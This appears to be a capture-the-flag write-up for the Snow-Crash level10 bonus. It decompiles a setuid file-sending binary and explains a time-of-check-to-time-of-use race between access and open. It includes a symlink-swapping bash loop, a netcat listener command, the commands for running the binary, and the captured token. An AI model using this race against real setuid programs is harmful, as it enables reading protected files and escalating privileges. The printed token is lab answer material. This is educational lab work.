# foothold

This is the bonus, so I will skip the basic stuff in these READMEs, because I
assume you are here, not copying, but seeing how others did it, do you?

And if you are in the bonus, you know the basic stuff, do you?

So, again, a binary in the home, with a token file.

Reverse it and... Pretty simple binary:
```c
int main(int argc,char **argv)
{
  char *__cp;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  undefined4 *in_stack_00000008;
  char *file;
  char *host;
  int fd;
  int ffd;
  int rc;
  char buffer [4096];
  sockaddr_in sin;
  undefined local_1024 [4096];
  sockaddr local_24;
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar6 = (char *)in_stack_00000008[1];
  __cp = (char *)in_stack_00000008[2];
  iVar2 = access((char *)in_stack_00000008[1],4);
  if (iVar2 == 0) {
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_24.sa_data[2] = '\0';
    local_24.sa_data[3] = '\0';
    local_24.sa_data[4] = '\0';
    local_24.sa_data[5] = '\0';
    local_24.sa_data[6] = '\0';
    local_24.sa_data[7] = '\0';
    local_24.sa_data[8] = '\0';
    local_24.sa_data[9] = '\0';
    local_24.sa_data[10] = '\0';
    local_24.sa_data[11] = '\0';
    local_24.sa_data[12] = '\0';
    local_24.sa_data[13] = '\0';
    local_24.sa_family = 2;
    local_24.sa_data[0] = '\0';
    local_24.sa_data[1] = '\0';
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    local_24.sa_data._0_2_ = uVar1;
    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    write(iVar2,local_1024,__n);
    iVar2 = puts("wrote file!");
  }
  else {
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2;
}
```

It checks if it has access to the file you provided in the first argument with
`access` (it checks for `R_OK`), and opens a socket with `socket(2,1,0);`,
let's break this down:
- `2`: AF_INET.
- `1`: SOCK_STREAM.
- `0`: protocol value, not really needed for AF_INTET.

Then it initializes the `sockaddr` struct, it sets the IP to the second arugment
(`argv[2]`), and the port to `6969`, and then connects.

Then it tries to read 4096 bytes from the provided file, and write them to the
socket, after that, it disconnects.

# exploit

Pretty simple exploit, this vulnerability is known as TOCTOU
(Time-Of-Check-To-Time-Of-Use), or race condition.

Basically, there's a small gap between the access and the open calls, so, I
will create a symlink to a file I own, `access` will success, and after that,
I will swap the symlink for one pointing to `token`.

This works because `access` checks permissions for the Original UID, but `open`
uses the Effective UID.

Let's create a simple script in `/dev/shm/rc.sh` for those symlinks:
```bash
#!/bin/bash

touch /tmp/fake

while true; do
    ln -sf /tmp/fake /tmp/token
    ln -sf /home/user/level10/token /tmp/token
done
```

So, indeed, I ended up with three ssh sessions, one for running the binary until
the race condition works, other for listening to it, and other one for running
the script.

I just need run the script, and open a listener:
```bash
# The snow-crash machine has BSD netcat :vomit:, so I'll use nc.traditional
nc.traditional -lvvnp 6969
```

And execute the binary, until it works:
```bash
./level10 /tmp/token 127.0.0.1
```

After a few times, I shoud have probably looped the execution, but who cares now.

It worked! And I get the following bytes:
`.*( )*.` and `woupa2yuojeeaaed06riuj63c`.

It's possible that you will receive only the banner (`.*( )*.`), that's because
the race condition evaded the `access` successfully, but opened the fake file,
so the token is not returned, just keep trying.

This one was tricker than the usuals, but still easy.

Now the usual, `su flag10` and `getflag`.
